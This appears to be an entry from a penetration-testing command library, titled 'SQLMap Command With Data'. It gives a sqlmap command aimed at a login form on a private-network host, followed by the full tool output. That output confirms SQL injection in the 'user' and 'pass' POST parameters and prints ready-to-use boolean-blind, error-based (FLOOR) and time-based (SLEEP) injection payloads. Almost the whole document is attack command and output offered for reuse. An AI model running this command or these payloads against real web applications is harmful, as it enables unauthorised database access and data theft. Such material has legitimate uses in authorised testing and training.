---
id: cc3e9ca2-8ff5-4f7c-84ca-02a3147e60cb
name: SQLMap Command With Data
type: command
executor: ''
data: sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo@vcart.com&pass=demo&selop=2'
output: "        ___\n       __H__\n ___ ___[(]_____ ___ ___  {1.2.7#stable}\n|_ -|\
  \ . [']     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 21:26:39\n\n\
  [21:26:40] [INFO] resuming back-end DBMS 'mysql' \n[21:26:40] [INFO] testing connection\
  \ to the target URL\nsqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'.\
  \ Do you want to follow? [Y/n] y\nredirect is a result of a POST request. Do you\
  \ want to resend original POST data to a new location? [Y/n] y\n[21:26:43] [INFO]\
  \ testing if the target URL content is stable\n[21:26:43] [WARNING] POST parameter\
  \ 'user' does not appear to be dynamic\n[21:26:43] [INFO] heuristic (basic) test\
  \ shows that POST parameter 'user' might be injectable (possible DBMS: 'MySQL')\n\
  [21:26:43] [INFO] heuristic (XSS) test shows that POST parameter 'user' might be\
  \ vulnerable to cross-site scripting (XSS) attacks\n[21:26:43] [INFO] testing for\
  \ SQL injection on POST parameter 'user'\nit looks like the back-end DBMS is 'MySQL'.\
  \ Do you want to skip test payloads specific for other DBMSes? [Y/n] y\nfor the\
  \ remaining tests, do you want to include all tests for 'MySQL' extending provided\
  \ level (1) and risk (1) values? [Y/n] y\n[21:26:47] [INFO] testing 'AND boolean-based\
  \ blind - WHERE or HAVING clause'\n[21:26:47] [INFO] POST parameter 'user' appears\
  \ to be 'AND boolean-based blind - WHERE or HAVING clause' injectable \n[21:26:47]\
  \ [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP\
  \ BY clause (BIGINT UNSIGNED)'\n[21:26:47] [INFO] testing 'MySQL >= 5.5 OR error-based\
  \ - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[21:26:47] [INFO] testing 'MySQL\
  \ >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'\n[21:26:47] [INFO]\
  \ testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause\
  \ (FLOOR)'\n[21:26:47] [INFO] POST parameter 'user' is 'MySQL >= 5.0 AND error-based\
  \ - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable \n[21:26:47]\
  \ [INFO] testing 'MySQL inline queries'\n[21:26:47] [INFO] testing 'MySQL > 5.0.11\
  \ stacked queries (comment)'\n[21:26:47] [WARNING] time-based comparison requires\
  \ larger statistical model, please wait........... (done)                      \
  \                      \n[21:26:48] [INFO] testing 'MySQL > 5.0.11 stacked queries'\n\
  [21:26:48] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'\n\
  [21:26:48] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'\n[21:26:48]\
  \ [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'\n[21:26:48]\
  \ [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'\n[21:26:48] [INFO]\
  \ testing 'MySQL >= 5.0.12 AND time-based blind'\n[21:26:58] [INFO] POST parameter\
  \ 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable \n[21:26:58]\
  \ [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[21:26:58] [INFO]\
  \ automatically extending ranges for UNION query injection technique tests as there\
  \ is at least one other (potential) technique found\n[21:26:58] [INFO] target URL\
  \ appears to be UNION injectable with 8 columns\ninjection not exploitable with\
  \ NULL values. Do you want to try with a random integer value for option '--union-char'?\
  \ [Y/n] y\n[21:27:02] [WARNING] if UNION based SQL injection is not detected, please\
  \ consider forcing the back-end DBMS (e.g. '--dbms=mysql') \n[21:27:02] [INFO] testing\
  \ 'MySQL UNION query (64) - 1 to 20 columns'\n[21:27:02] [WARNING] reflective value(s)\
  \ found and filtering out\n[21:27:02] [INFO] testing 'MySQL UNION query (64) - 21\
  \ to 40 columns'\n[21:27:03] [INFO] testing 'MySQL UNION query (64) - 41 to 60 columns'\n\
  [21:27:03] [INFO] testing 'MySQL UNION query (64) - 61 to 80 columns'\n[21:27:03]\
  \ [INFO] testing 'MySQL UNION query (64) - 81 to 100 columns'\nPOST parameter 'user'\
  \ is vulnerable. Do you want to keep testing the others (if any)? [y/N] y\n[21:27:05]\
  \ [WARNING] POST parameter 'pass' does not appear to be dynamic\n[21:27:05] [INFO]\
  \ heuristic (basic) test shows that POST parameter 'pass' might be injectable (possible\
  \ DBMS: 'MySQL')\n[21:27:05] [INFO] heuristic (XSS) test shows that POST parameter\
  \ 'pass' might be vulnerable to cross-site scripting (XSS) attacks\n[21:27:05] [INFO]\
  \ testing for SQL injection on POST parameter 'pass'\n[21:27:05] [INFO] testing\
  \ 'AND boolean-based blind - WHERE or HAVING clause'\n[21:27:06] [INFO] POST parameter\
  \ 'pass' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable\
  \ \n[21:27:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER\
  \ BY or GROUP BY clause (BIGINT UNSIGNED)'\n[21:27:06] [INFO] testing 'MySQL >=\
  \ 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[21:27:22] [INFO]\
  \ testing 'MySQL UNION query (64) - 61 to 80 columns'\n[21:27:22] [INFO] testing\
  \ 'MySQL UNION query (64) - 81 to 100 columns'\nPOST parameter 'pass' is vulnerable.\
  \ Do you want to keep testing the others (if any)? [y/N] y\n[21:27:26] [WARNING]\
  \ POST parameter 'selop' does not appear to be dynamic\n[21:27:26] [WARNING] heuristic\
  \ (basic) test shows that POST parameter 'selop' might not be injectable\n[21:27:26]\
  \ [INFO] testing for SQL injection on POST parameter 'selop'\n[21:27:26] [INFO]\
  \ testing 'AND boolean-based blind - WHERE or HAVING clause'\n[21:27:27] [INFO]\
  \ testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'\n[21:27:31]\
  \ [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'\n\
  [21:27:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL\
  \ comment) (NOT)'\n[21:29:04] [INFO] testing 'MySQL inline queries'\n[21:29:04]\
  \ [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'\n[21:29:07] [INFO] testing\
  \ 'MySQL > 5.0.11 stacked queries'\n[21:29:11] [INFO] testing 'MySQL > 5.0.11 stacked\
  \ queries (query SLEEP - comment)'\n[21:29:14] [INFO] testing 'MySQL > 5.0.11 stacked\
  \ queries (query SLEEP)'\n[[21:30:31] [INFO] testing 'MySQL >= 5.1 time-based blind\
  \ (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'\n[21:30:35] [INFO] testing 'MySQL\
  \ >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'\n\
  [21:30:37] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'\n\
  [21:30:37] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace\
  \ (substraction)'\n[21:30:37] [INFO] testing 'MySQL <= 5.0.11 time-based blind -\
  \ Parameter replace (heavy queries)'\n[21:30:37] [INFO] testing 'MySQL time-based\
  \ blind - Parameter replace (bool)'\n[21:30:37] [INFO] testing 'MySQL time-based\
  \ blind - Parameter replace (ELT)'\n[21:30:37] [INFO] testing 'MySQL time-based\
  \ blind - Parameter replace (MAKE_SET)'\n[21:30:37] [INFO] testing 'MySQL >= 5.0.12\
  \ time-based blind - ORDER BY, GROUP BY clause'\n[21:30:37] [INFO] testing 'MySQL\
  \ <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)'\n[21:30:37]\
  \ [INFO] testing 'Generic UNION query (64) - 1 to 10 columns'\n[21:30:38] [INFO]\
  \ testing 'MySQL UNION query (64) - 1 to 10 columns'\nit is not recommended to perform\
  \ extended UNION tests if there is not at least one other (potential) technique\
  \ found. Do you want to skip? [Y/n] y\n[21:30:58] [WARNING] POST parameter 'selop'\
  \ does not seem to be injectable\nsqlmap identified the following injection point(s)\
  \ with a total of 3967 HTTP(s) requests:\n---\nParameter: user (POST)\n    Type:\
  \ boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n\
  \    Payload: user=demo@vcart.com' AND 4501=4501 AND 'FDuX'='FDuX&pass=demo&selop=2\n\
  \n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING,\
  \ ORDER BY or GROUP BY clause (FLOOR)\n    Payload: user=demo@vcart.com' AND (SELECT\
  \ 2109 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(2109=2109,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x\
  \ FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CniM'='CniM&pass=demo&selop=2\n\
  \n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n\
  \    Payload: user=demo@vcart.com' AND SLEEP(5) AND 'ZNQd'='ZNQd&pass=demo&selop=2\n\
  \nParameter: pass (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based\
  \ blind - WHERE or HAVING clause\n    Payload: user=demo@vcart.com&pass=demo' AND\
  \ 2948=2948 AND 'YLTi'='YLTi&selop=2\n\n    Type: error-based\n    Title: MySQL\
  \ >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n\
  \    Payload: user=demo@vcart.com&pass=demo' AND (SELECT 9195 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT\
  \ (ELT(9195=9195,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS\
  \ GROUP BY x)a) AND 'inPR'='inPR&selop=2\n\n    Type: AND/OR time-based blind\n\
  \    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: user=demo@vcart.com&pass=demo'\
  \ AND SLEEP(5) AND 'QOIf'='QOIf&selop=2\n---\nthere were multiple injection points,\
  \ please select the one to use for following injections:\n[0] place: POST, parameter:\
  \ user, type: Single quoted string (default)\n[1] place: POST, parameter: pass,\
  \ type: Single quoted string\n[q] Quit\n> 0\n[21:31:13] [INFO] the back-end DBMS\
  \ is MySQL\nweb application technology: Apache 2.4.41, PHP 7.1.32\nback-end DBMS:\
  \ MySQL >= 5.0\n[21:31:13] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.10'\n\
  \n"
created_at: '2020-09-02T17:58:12.826945+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap Command With Data

```bash
sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo@vcart.com&pass=demo&selop=2'
```

## Expected Output

```
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.7#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:26:39

[21:26:40] [INFO] resuming back-end DBMS 'mysql' 
[21:26:40] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
[21:26:43] [INFO] testing if the target URL content is stable
[21:26:43] [WARNING] POST parameter 'user' does not appear to be dynamic
[21:26:43] [INFO] heuristic (basic) test shows that POST parameter 'user' might be injectable (possible DBMS: 'MySQL')
[21:26:43] [INFO] heuristic (XSS) test shows that POST parameter 'user' might be vulnerable to cross-site scripting (XSS) attacks
[21:26:43] [INFO] testing for SQL injection on POST parameter 'user'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[21:26:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:26:47] [INFO] POST parameter 'user' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[21:26:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:26:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:26:47] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[21:26:47] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:26:47] [INFO] POST parameter 'user' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[21:26:47] [INFO] testing 'MySQL inline queries'
[21:26:47] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[21:26:47] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                            
[21:26:48] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[21:26:48] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[21:26:48] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[21:26:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[21:26:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[21:26:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[21:26:58] [INFO] POST parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[21:26:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:26:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:26:58] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[21:27:02] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[21:27:02] [INFO] testing 'MySQL UNION query (64) - 1 to 20 columns'
[21:27:02] [WARNING] reflective value(s) found and filtering out
[21:27:02] [INFO] testing 'MySQL UNION query (64) - 21 to 40 columns'
[21:27:03] [INFO] testing 'MySQL UNION query (64) - 41 to 60 columns'
[21:27:03] [INFO] testing 'MySQL UNION query (64) - 61 to 80 columns'
[21:27:03] [INFO] testing 'MySQL UNION query (64) - 81 to 100 columns'
POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[21:27:05] [WARNING] POST parameter 'pass' does not appear to be dynamic
[21:27:05] [INFO] heuristic (basic) test shows that POST parameter 'pass' might be injectable (possible DBMS: 'MySQL')
[21:27:05] [INFO] heuristic (XSS) test shows that POST parameter 'pass' might be vulnerable to cross-site scripting (XSS) attacks
[21:27:05] [INFO] testing for SQL injection on POST parameter 'pass'
[21:27:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:27:06] [INFO] POST parameter 'pass' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[21:27:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:27:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:27:22] [INFO] testing 'MySQL UNION query (64) - 61 to 80 columns'
[21:27:22] [INFO] testing 'MySQL UNION query (64) - 81 to 100 columns'
POST parameter 'pass' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[21:27:26] [WARNING] POST parameter 'selop' does not appear to be dynamic
[21:27:26] [WARNING] heuristic (basic) test shows that POST parameter 'selop' might not be injectable
[21:27:26] [INFO] testing for SQL injection on POST parameter 'selop'
[21:27:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:27:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[21:27:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[21:27:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)'
[21:29:04] [INFO] testing 'MySQL inline queries'
[21:29:04] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[21:29:07] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[21:29:11] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[21:29:14] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[[21:30:31] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[21:30:35] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[21:30:37] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[21:30:37] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[21:30:37] [INFO] testing 'MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries)'
[21:30:37] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[21:30:37] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[21:30:37] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[21:30:37] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[21:30:37] [INFO] testing 'MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[21:30:37] [INFO] testing 'Generic UNION query (64) - 1 to 10 columns'
[21:30:38] [INFO] testing 'MySQL UNION query (64) - 1 to 10 columns'
it is not recommended to perform extended UNION tests if there is not at least one other (potential) technique found. Do you want to skip? [Y/n] y
[21:30:58] [WARNING] POST parameter 'selop' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 3967 HTTP(s) requests:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=demo@vcart.com' AND 4501=4501 AND 'FDuX'='FDuX&pass=demo&selop=2

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=demo@vcart.com' AND (SELECT 2109 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(2109=2109,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CniM'='CniM&pass=demo&selop=2

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=demo@vcart.com' AND SLEEP(5) AND 'ZNQd'='ZNQd&pass=demo&selop=2

Parameter: pass (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=demo@vcart.com&pass=demo' AND 2948=2948 AND 'YLTi'='YLTi&selop=2

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=demo@vcart.com&pass=demo' AND (SELECT 9195 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(9195=9195,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'inPR'='inPR&selop=2

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=demo@vcart.com&pass=demo' AND SLEEP(5) AND 'QOIf'='QOIf&selop=2
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: user, type: Single quoted string (default)
[1] place: POST, parameter: pass, type: Single quoted string
[q] Quit
> 0
[21:31:13] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0
[21:31:13] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.10'


```


